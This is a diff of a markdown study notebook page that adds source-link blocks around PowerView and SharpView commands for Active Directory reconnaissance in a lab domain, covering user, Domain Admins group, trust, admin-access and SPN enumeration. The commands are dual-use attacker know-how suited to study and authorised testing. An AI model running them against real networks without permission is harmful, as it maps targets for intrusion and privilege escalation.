+**Original note sections:** [AD Password Policies and User Lists — Key Enumeration Methods](/active-directory/password-policy-user-lists#key-enumeration-methods)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="PowerView / SharpView">
@@ -1150,11 +1642,25 @@ Get-DomainPolicy
 Get-DomainUser -Identity mmorgan
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Enumeration from Windows — PowerView / SharpView](/active-directory/enumeration-windows#powerview-/-sharpview)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Active Directory Enumeration from Windows**
 
 ```text
 Get-DomainGroupMember -Identity "Domain Admins" -Recurse
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Enumeration from Windows — PowerView / SharpView](/active-directory/enumeration-windows#powerview-/-sharpview)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 **Active Directory Enumeration from Windows**
 
@@ -1162,11 +1668,25 @@ Get-DomainGroupMember -Identity "Domain Admins" -Recurse
 Get-DomainTrustMapping
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Enumeration from Windows — PowerView / SharpView](/active-directory/enumeration-windows#powerview-/-sharpview)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Active Directory Enumeration from Windows**
 
 ```text
 Test-AdminAccess -ComputerName ACADEMY-EA-MS01
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Enumeration from Windows — PowerView / SharpView](/active-directory/enumeration-windows#powerview-/-sharpview)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 **Active Directory Enumeration from Windows**
 
@@ -1174,11 +1694,25 @@ Test-AdminAccess -ComputerName ACADEMY-EA-MS01
 Get-DomainUser -SPN
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Enumeration from Windows — PowerView / SharpView](/active-directory/enumeration-windows#powerview-/-sharpview)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Active Directory Enumeration from Windows**
 
 ```text
 .\SharpView.exe Get-DomainUser -Identity forend
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Enumeration from Windows — PowerView / SharpView](/active-directory/enumeration-windows#powerview-/-sharpview)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 **Active Directory Enumeration from Windows**
 
@@ -1187,6 +1721,13 @@ Context from the notebook: Purpose:  The SharpView equivalent of PowerView's  Ge
 ```text
 Get-DomainUser
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Enumeration from Windows — PowerView / SharpView](/active-directory/enumeration-windows#powerview-/-sharpview) · [PowerView — Load and Enumerate — Common problems](/tools/powerview#common-problems)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -1202,6 +1743,13 @@ Context from the notebook: Script not found Use  Get-Location  and  Test-Path .\
 Get-Location
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [PowerView — Load and Enumerate — Common problems](/tools/powerview#common-problems) · [Rubeus — Find a Kerberos Task — Common problems](/tools/rubeus#common-problems)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **PowerView — Load and Enumerate**
 
 Context from the notebook: Script not found Use  Get-Location  and  Test-Path .\PowerView.ps1 ; open the folder that actually contains the script.
@@ -1210,6 +1758,21 @@ Context from the notebook: Script not found Use  Get-Location  and  Test-Path .\
 Test-Path .\PowerView.ps1
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [PowerView — Load and Enumerate — Common problems](/tools/powerview#common-problems)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [PowerView — Load and Enumerate](/tools/powerview)
+
+{/* VAULT_RELATED_END */}
